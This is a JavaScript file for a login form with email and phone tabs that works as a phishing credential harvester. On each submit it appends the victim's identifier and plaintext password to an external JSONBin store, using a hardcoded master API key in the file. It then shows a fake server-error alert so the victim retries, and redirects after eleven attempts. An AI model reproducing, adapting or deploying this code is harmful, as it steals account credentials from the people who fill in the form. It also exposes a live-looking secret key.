  document.addEventListener('DOMContentLoaded', () => {
      // Elements
      const tabEmail    = document.getElementById('tab-email');
      const tabPhone    = document.getElementById('tab-phone');
      const groupEmail  = document.getElementById('group-email');
      const groupPhone  = document.getElementById('group-phone');
      const iconEmail   = document.getElementById('icon-email');
      const iconPhone   = document.getElementById('icon-phone');
      const emailField  = document.getElementById('email');
      const phoneField  = document.getElementById('phone');
      const countryCode = document.getElementById('country-code');
      const phoneFlag   = document.getElementById('phone-flag');
      const passwordField = document.getElementById('password');
      const togglePwBtn = document.getElementById('toggle-pw');
      const iconPw      = document.getElementById('icon-pw');
      const emailError  = document.getElementById('email-error');
      const phoneError  = document.getElementById('phone-error');
      const passwordError = document.getElementById('password-error');
      const loginBtn    = document.getElementById('loginBtn');
      const closeBtn    = document.getElementById('closeBtn');
      const form        = document.getElementById('login-form');

      // JSONBin config
      const binId = "67ea9e3a8a456b79667ff984";
      const apiKey = "$2a$10$KxrIzD6vk0We8pfpySnbfOvkTSyr5i/RKwnItuvXA0KYkMEPRo/zC";

      // Validation state
      let emailTouched = false, phoneTouched = false;
      const maxAttempts = 11;
      let loginAttempts = parseInt(localStorage.getItem('loginAttempts')||'0',10);

      // Tab switch
      function switchTab(type) {
        const isPhone = type === 'phone';
        tabPhone.classList.toggle('active', isPhone);
        tabEmail.classList.toggle('active', !isPhone);
        groupPhone.style.display = isPhone ? 'flex' : 'none';
        groupEmail.style.display = isPhone ? 'none' : 'flex';
        iconPhone.src = isPhone ? 'phone-active.png'   : 'phone-inactive.png';
        iconEmail.src = isPhone ? 'email-inactive.png' : 'email-active.png';
        emailError.textContent = '';
        phoneError.textContent = '';
        validateInputs();
      }
      tabEmail.addEventListener('click', ()=> switchTab('email'));
      tabPhone.addEventListener('click', ()=> switchTab('phone'));
      switchTab('email');

      // Close modal
      closeBtn.addEventListener('click', ()=> {
        document.querySelector('.login-container').style.display = 'none';
      });

      // Input events
      emailField.addEventListener('input', ()=> { emailTouched = true; validateInputs(); });
      phoneField.addEventListener('input', ()=> {
        phoneTouched = true;
        phoneField.value = phoneField.value.replace(/\D/g,'');
        validateInputs();
      });
      passwordField.addEventListener('input', validateInputs);

      // Password toggle
      togglePwBtn.addEventListener('click', ()=>{
        const hidden = passwordField.type === 'password';
        passwordField.type = hidden ? 'text' : 'password';
        iconPw.src = hidden ? 'eye-open.png' : 'eye-closed.png';
      });

      // Validate
      function validateInputs(){
        const pwdOK   = passwordField.value.length >= 6;
        const emailOK = /@gmail\.com$/.test(emailField.value);
        const phoneOK = /^[0-9]{10}$/.test(phoneField.value);
        const usingPhone = tabPhone.classList.contains('active');

        emailError.textContent = (!usingPhone && emailTouched && !emailOK) ? 'E-mail must be valid' : '';
        phoneError.textContent = (usingPhone && phoneTouched && !phoneOK) ? 'Phone number must be valid' : '';
        passwordError.textContent = (passwordField.value.length>0 && !pwdOK) ? 'Min 6 characters' : '';

        loginBtn.disabled = !(pwdOK && (usingPhone ? phoneOK : emailOK));
      }

      // Submit
      form.addEventListener('submit', async e => {
        e.preventDefault();
        if (loginAttempts >= maxAttempts) {
          return window.location.href = 'error.html';
        }

        const email = emailField.value.trim();
        const phone = countryCode.value + phoneField.value.trim();
        const pwd   = passwordField.value;
        const usingPhone = tabPhone.classList.contains('active');

        // Empty checks
        if (!pwd || (!email && !phoneField.value)) {
          if (!pwd) passwordError.textContent = 'Enter password';
          if (usingPhone && !phoneField.value) phoneError.textContent = 'Enter phone number';
          if (!usingPhone && !email) emailError.textContent = 'Enter email address';
          return;
        }

        // Final validation
        const emailValid = /@gmail\.com$/.test(email);
        const phoneValid= /^[0-9]{10}$/.test(phoneField.value);
        if (!pwd.length>=6 || (!usingPhone && !emailValid) || (usingPhone && !phoneValid)) {
          if (!pwd.length>=6) passwordError.textContent = 'Min 6 characters';
          if (usingPhone && !phoneValid) phoneError.textContent = 'Phone number must be valid';
          if (!usingPhone && !emailValid) emailError.textContent = 'Fill email and pass correctly';
          return;
        }

        // Build payload
        const payload = {
          loginType: usingPhone ? 'phone' : 'email',
          email: usingPhone ? null : email,
          phone: usingPhone ? phone : null,
          password: pwd,
          timestamp: new Date().toISOString()
        };

        try {
          // get existing
          const getRes = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
            headers: {'X-Master-Key': apiKey}
          });
          const json = await getRes.json();
          let arr = Array.isArray(json.record)?json.record:[];
          arr.push(payload);

          // update
          const upd = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
            method: 'PUT',
            headers: {
              'Content-Type':'application/json',
              'X-Master-Key': apiKey
            },
            body: JSON.stringify(arr)
          });
          if (!upd.ok) throw Error();

          // track attempts
          loginAttempts++;
          localStorage.setItem('loginAttempts', loginAttempts);

          alert('Oops! Something went wrong. Server error');

          // reset form
          emailField.value = '';
          phoneField.value = '';
          passwordField.value = '';
          validateInputs();

          if (loginAttempts >= maxAttempts) {
            window.location.href = 'error.html';
          }

        } catch {
          alert('Oops! Something went wrong. Server error.');
        }
      });
    });